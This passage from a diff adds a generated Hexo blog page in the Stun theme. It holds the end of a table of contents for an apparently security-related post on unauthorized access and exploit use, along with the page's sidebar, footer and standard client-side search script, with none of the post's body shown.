+          未授权访问</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.2.</span> <span class="toc-text">
+          exp利用</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%AF%84%E4%BC%B0"><span class="toc-number">1.7.</span> <span class="toc-text">
+          自动化评估</span></a></li></ol></li></ol></section><!-- ov = overview--><section class="sidebar-ov hide"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="https://gitee.com/BothSavage/PicGo/raw/master/image/头像.png" alt="avatar"></div><p class="sidebar-ov-author__text">hello world</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">13</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">1</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">13</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section><div class="sidebar-reading"><div class="sidebar-reading-info"><span class="sidebar-reading-info__text">你已阅读了 </span><span class="sidebar-reading-info__num">0</span><span class="sidebar-reading-info__perc">%</span></div><div class="sidebar-reading-line"></div></div></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2021</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>John Doe</span></div><div><span>由 <a href="http://hexo.io/" title="Hexo" target="_blank" rel="noopener">Hexo</a> 强力驱动</span><span> v5.4.0</span><span class="footer__devider">|</span><span>主题 - <a href="https://github.com/liuyib/hexo-theme-stun/" title="Stun" target="_blank" rel="noopener">Stun</a></span><span> v2.6.2</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><div class="search-mask"></div><div class="search-popup"><span class="search-close"></span><div class="search-input"><input placeholder="搜索文章（支持多关键词，请用空格分隔）"></div><div class="search-results"></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script>function initSearch() {
+  var isXML = true;
+  var search_path = 'search.json';
+
+  if (!search_path) {
+    search_path = 'search.xml';
+  } else if (/json$/i.test(search_path)) {
+    isXML = false;
+  }
+
+  var path = '/' + search_path;
+  $.ajax({
+    url: path,
+    dataType: isXML ? 'xml' : 'json',
+    async: true,
+    success: function (res) {
+      var datas = isXML ? $('entry', res).map(function () {
+        // 将 XML 转为 JSON
+        return {
+          title: $('title', this).text(),
+          content: $('content', this).text(),
+          url: $('url', this).text()
+        };
+      }).get() : res;
+      var $input = $('.search-input input');
+      var $result = $('.search-results');
+      // 搜索对象（标题、内容）的权重，影响显示顺序
+      var WEIGHT = { title: 100, content: 1 };
+      var searchPost = function () {
+        var searchText = $input.val().toLowerCase().trim();
+        // 根据空白字符分隔关键字
+        var keywords = searchText.split(/[\s]+/);
+        // 搜索结果
+        var matchPosts = [];
+
+        // 有多个关键字时，将原文字整个保存下来
+        if (keywords.length > 1) {
+          keywords.push(searchText);
+        }
+        // 防止未输入字符时搜索
+        if (searchText.length > 0) {
+          datas.forEach(function (data) {
+            var isMatch  = false;
+            // 没有标题的文章使用预设的 i18n 变量代替
+            var title = (data.title && data.title.trim()) || '[ 文章无标题 ]';
+            var titleLower = title && title.toLowerCase();
+            // 删除 HTML 标签 和 所有空白字符
+            var content = data.content && data.content.replace(/<[^>]+>/g, '');
+            var contentLower = content && content.toLowerCase();
+            // 删除重复的 /
+            var postURL = data.url && decodeURI(data.url).replace(/\/{2,}/g, '/');
+            // 标题中匹配到的关键词
+            var titleHitSlice = [];
+            // 内容中匹配到的关键词
+            var contentHitSlice = [];
+
+            keywords.forEach(function (keyword) {
+              /**
+              * 获取匹配的关键词的索引
+              * @param {String} keyword 要匹配的关键字
+              * @param {String} text 原文字
+              * @param {Boolean} caseSensitive 是否区分大小写
+              * @param {Number} weight 匹配对象的权重。权重大的优先显示
+              * @return {Array}
+              */
+              function getIndexByword (word, text, caseSensitive, weight) {
+                if (!word || !text) {
+                  return [];
+                };
+
+                var startIndex = 0; // 每次匹配的开始索引
+                var index = -1;     // 匹配到的索引值
+                var result = [];    // 匹配结果
+
+                if (!caseSensitive) {
+                  word = word.toLowerCase();
+                  text = text.toLowerCase();
+                }
+
+                while((index = text.indexOf(word, startIndex)) !== -1) {
+                  var hasMatch = false;
+                  // 索引位置相同的关键词，保留长度较长的
+                  titleHitSlice.forEach(function (hit) {
+                    if (hit.index === index && hit.word.length < word.length) {
+                      hit.word = word;
+                      hasMatch = true;
+                    }
+                  });
+                  startIndex = index + word.length;
+                  !hasMatch && result.push({ index: index, word: word, weight: weight });
+                }
+                return result;
+              }
+              titleHitSlice = titleHitSlice.concat(getIndexByword(keyword, titleLower, false, WEIGHT.title));
+              contentHitSlice = contentHitSlice.concat(getIndexByword(keyword, contentLower, false, WEIGHT.content));
+            });
+
+            var hitTitle = titleHitSlice.length;
+            var hitContent = contentHitSlice.length;
+
+            if (hitTitle > 0 || hitContent > 0) {
+              isMatch = true;
+            }
+            if (isMatch) {
+              ;[titleHitSlice, contentHitSlice].forEach(function (hit) {
+                // 按照匹配文字的索引的递增顺序排序
+                hit.sort(function (left, right) {
+                  return left.index - right.index;
+                });
+              });
+              /**
+              * 给文本中匹配到的关键词添加标记，从而进行高亮显示
+              * @param {String} text 原文本
+              * @param {Array} hitSlice 匹配项的索引信息
+              * @param {Number} start 开始索引
+              * @param {Number} end 结束索引
+              * @return {String}
+              */
+              function highlightKeyword (text, hitSlice, start, end) {
+                if (!text || !hitSlice || !hitSlice.length) {
+                  return;
+                }
+
+                var result = '';
+                var startIndex = start;
+                var endIndex = end;
+                hitSlice.forEach(function (hit) {
+                  if (hit.index < startIndex) {
+                    return;
+                  }
+
+                  var hitWordEnd = hit.index + hit.word.length;
+                  result += text.slice(startIndex, hit.index);
+                  result += '<b>' + text.slice(hit.index, hitWordEnd) + '</b>';
+                  startIndex = hitWordEnd;
+                });
+                result += text.slice(startIndex, endIndex);
+                return result;
+              }
+
+              var postData = {};
+              // 文章总的搜索权重
+              var postWeight = titleHitSlice.length * WEIGHT.title + contentHitSlice.length * WEIGHT.content;
+              // 标记匹配关键词后的标题
+              var postTitle = highlightKeyword(title, titleHitSlice, 0, title.length) || title;
+              // 标记匹配关键词后的内容
+              var postContent;
+              // 显示内容的长度
+              var SHOW_WORD_LENGTH = 200;
+              // 命中关键词前的字符显示长度
+              var SHOW_WORD_FRONT_LENGTH = 20;
+              var SHOW_WORD_END_LENGTH = SHOW_WORD_LENGTH - SHOW_WORD_FRONT_LENGTH;
+
+              // 截取匹配的第一个字符，前后共 200 个字符来显示
+              if (contentHitSlice.length > 0) {
+                var firstIndex = contentHitSlice[0].index;
+                var start = firstIndex > SHOW_WORD_FRONT_LENGTH ? firstIndex - SHOW_WORD_FRONT_LENGTH : 0;
+                var end = firstIndex + SHOW_WORD_END_LENGTH;
+                postContent = highlightKeyword(content, contentHitSlice, start, end);
+              } else { // 未匹配到内容，直接截取前 200 个字符来显示
+                postContent = content.slice(0, SHOW_WORD_LENGTH);
+              }
+              postData.title = postTitle;
+              postData.content = postContent;
+              postData.url = postURL;
+              postData.weight = postWeight;
+              matchPosts.push(postData);
+            }
+          });
+        }
+
+        var resultInnerHtml = '';
+        if (matchPosts.length) {
+          // 按权重递增的顺序排序，使权重大的优先显示
+          matchPosts.sort(function (left, right) {
+            return right.weight - left.weight;
+          });
+          resultInnerHtml += '<ul>';
+          matchPosts.forEach(function (post) {
+            resultInnerHtml += '<li><a class="search-results-title" href="' + post.url + '">';
+            resultInnerHtml += post.title;
+            resultInnerHtml += '</a><div class="search-results-content">';
+            resultInnerHtml += post.content;
+            resultInnerHtml += '</div></li>';
+          });
+          resultInnerHtml += '</ul>';
+        } else {
+          resultInnerHtml += '<div class="search-results-none"><i class="far fa-meh"></i></div>';
+        }
+        $result.html(resultInnerHtml);
+      };
+      $input.on('input', searchPost);
+      $input.on('keyup', function (e) {
+        if (e.keyCode === Stun.utils.codeToKeyCode('Enter')) {
+          searchPost();
+        }
+      });
+    }
+  });
+}
+
+function closeSearch () {
+  $('body').css({ overflow: 'auto' });
+  $('.search-popup').css({ display: 'none' });
+  $('.search-mask').css({ display: 'none' });
+}
+
+window.addEventListener('DOMContentLoaded', function () {
+  Stun.utils.pjaxReloadLocalSearch = function () {
+    $('.header-nav-search').on('click', function (e) {
+      e.stopPropagation();
+      $('body').css('overflow', 'hidden');
+      $('.search-popup')
+        .velocity('stop')
+        .velocity('transition.expandIn', {
+          duration: 300,
+          complete: function () {
+            $('.search-popup input').focus();
+          }
+        });
+      $('.search-mask')
+        .velocity('stop')
+        .velocity('transition.fadeIn', {
+          duration: 300
+        });
+
+      initSearch();
+    });
+    $('.search-mask, .search-close').on('click', function () {
+      closeSearch();
+    });
+    $(document).on('keydown', function (e) {
+      // Escape <=> 27
+      if (e.keyCode === Stun.utils.codeToKeyCode('Escape')) {
+        closeSearch();
+      }
+    });
+  };
+
+  Stun.utils.pjaxReloadLocalSearch();
+}, false);
+
+function safeOpenUrl(url) {
+  var newTab = window.open();
+  newTab.opener = null;
+  newTab.location = url;
+}
+
+function extSearch(engine) {
+  var engines = {
+    google: 'https://www.google.com/search?q=',
+    bing: 'https://cn.bing.com/search?q=',
+    baidu: 'https://www.baidu.com/s?ie=UTF-8&wd=',
+  };
+  var host = window.location.host;
+  var query = $('.search-input input').val().toLowerCase().trim();
+  var uri = engines[engine] + query + ' site:' + host;
+
+  if (query) {
+    safeOpenUrl(uri);
+  } else {
+    Stun.utils.popAlert('warning', '请输入字符');
+  }
+}
+
+var assistSearchList = window.CONFIG.assistSearch;
+
+if (Array.isArray(assistSearchList)) {
+  assistSearchList.forEach(function (name) {
+    document.querySelector('.search-btns-item--' + name).addEventListener('click', function () {
+      extSearch(name);
+    }, false);
+  });
+}</script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script><script type="application/json" src="/search.json"></script></body></html>
